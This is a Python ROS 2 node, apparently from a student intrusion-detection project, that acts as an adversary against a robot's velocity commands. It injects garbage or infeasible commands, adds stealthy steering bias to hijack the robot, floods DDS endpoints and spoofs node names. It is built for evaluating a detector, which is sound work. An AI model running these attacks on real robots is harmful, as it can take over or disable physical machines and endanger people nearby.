#!/usr/bin/env python3
# =============================================================================
# File        : attack_injector.py
# Package     : physguard
# Project     : Cross-Layer Intrusion Detection for ROS 2 Robotic Networks
# Author      : Shyam Rithin S (RA2311004010308)
# Version     : 0.3
# =============================================================================
# Description
# -----------
# Adversary node. Publishes onto /cmd_vel_raw, the same topic as the legitimate
# controller, demonstrating that ROS 2 / DDS performs no publisher
# authentication by default.
#
# The attacker eavesdrops on /cmd_vel_auth (DDS traffic is unencrypted by
# default) and re-publishes the legitimate command with its own modification,
# at 5x the legitimate rate (100 Hz) so its messages dominate the wire.
#
# Modes (switch live: ros2 param set /attack_injector mode <name>)
#   none     idle; the publisher is destroyed, so an idle attacker leaves no
#            trace in the ROS 2 graph
#   garbage  NaN / out-of-range values
#   inject   large infeasible velocity (crude takeover)
#   stealth  small feasible speed bias; caught by CUSUM over time
#   hijack   feasible steering bias that drives the robot off the track
#   flood    rapid publisher create/destroy = DDS endpoint churn (DoS)
#
# Node-name spoofing: run with  --ros-args -r __node:=pure_pursuit  and the
# graph-based allowlist is fooled; the physics layer and the wire collector
# (two writers on the wire) still see it.
#
# Ground-truth instrumentation (evaluation only, not used by the detector):
#   /attack/mode  String, published at 2 Hz.
#
# LAB USE ONLY. Run only against your own robot on an isolated ROS_DOMAIN_ID.
# =============================================================================
import math
import random

import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist
from std_msgs.msg import String


class AttackInjector(Node):
    def __init__(self):
        super().__init__('attack_injector')
        self.declare_parameter('mode', 'none')
        self.declare_parameter('intensity', 0.6)
        self.declare_parameter('rate', 100.0)
        self.pub = None
        self.flood_pubs = []
        self.auth = (0.0, 0.0)
        self.t = 0.0
        self._flood_t = 0.0
        self.last_mode = None
        self.create_subscription(Twist, 'cmd_vel_auth', self.on_auth, 10)
        self.mode_pub = self.create_publisher(String, 'attack/mode', 10)
        self.dt = 1.0 / float(self.get_parameter('rate').value)
        self.create_timer(self.dt, self.step)
        self.create_timer(0.5, lambda: self.mode_pub.publish(
            String(data=str(self.get_parameter('mode').value))))
        self.get_logger().warn('attack_injector up (idle) - LAB USE ONLY')

    def on_auth(self, m):
        self.auth = (m.linear.x, m.angular.z)

    def _set_wire_pub(self, active):
        """Create/destroy the single /cmd_vel_raw writer used by the
        command-injection modes. The flood pool is managed separately so that
        entering flood mode does not tear it down on every cycle."""
        if active and self.pub is None:
            self.pub = self.create_publisher(Twist, 'cmd_vel_raw', 10)
        elif not active and self.pub is not None:
            self.destroy_publisher(self.pub)
            self.pub = None

    def _clear_flood(self):
        while self.flood_pubs:
            self.destroy_publisher(self.flood_pubs.pop())

    def step(self):
        mode = str(self.get_parameter('mode').value)
        k = float(self.get_parameter('intensity').value)
        self.t += self.dt
        if mode != self.last_mode:
            self.get_logger().warn(f'attack mode -> {mode}')
            self.last_mode = mode
            self.mode_pub.publish(String(data=mode))
        self._set_wire_pub(mode not in ('none', 'flood'))
        if mode != 'flood':
            self._clear_flood()
        if mode == 'none':
            return
        if mode == 'flood':
            # Hold a bounded pool of short-lived participants and churn a few
            # each cycle. Gated to ~10 Hz, well below the 100 Hz publish rate,
            # so the attacker node itself stays responsive; it is the sustained
            # create/destroy churn that the network layer and the wire collector
            # detect, not the raw creation rate.
            if self.t - self._flood_t >= 0.1:
                self._flood_t = self.t
                for _ in range(int(6 * k) + 1):
                    p = self.create_publisher(
                        Twist, f'junk_{random.randint(0, 99999)}', 1)
                    self.flood_pubs.append(p)
                while len(self.flood_pubs) > 60:
                    self.destroy_publisher(self.flood_pubs.pop(0))
            return

        v, w = self.auth
        m = Twist()
        if mode == 'garbage':
            m.linear.x = float('nan') if random.random() < 0.5 else 6.0 + 8.0 * k
            m.angular.z = 12.0 * k * (random.random() * 2 - 1)
        elif mode == 'inject':
            m.linear.x = v + 1.4 + 2.2 * k
            m.angular.z = w + 1.6 * k * math.sin(7 * self.t)
        elif mode == 'stealth':
            m.linear.x = v + 0.10 * k
            m.angular.z = w + 0.14 * k * math.sin(0.9 * self.t)
        elif mode == 'hijack':
            m.linear.x = min(v + 0.10, 0.6)
            m.angular.z = w - 0.70 * (k / 0.6)
        else:
            self.get_logger().error(f'unknown mode {mode}', throttle_duration_sec=2.0)
            return
        self.pub.publish(m)


def main():
    rclpy.init()
    n = AttackInjector()
    try:
        rclpy.spin(n)
    except KeyboardInterrupt:
        pass
    finally:
        n.destroy_node()
        rclpy.try_shutdown()


if __name__ == '__main__':
    main()
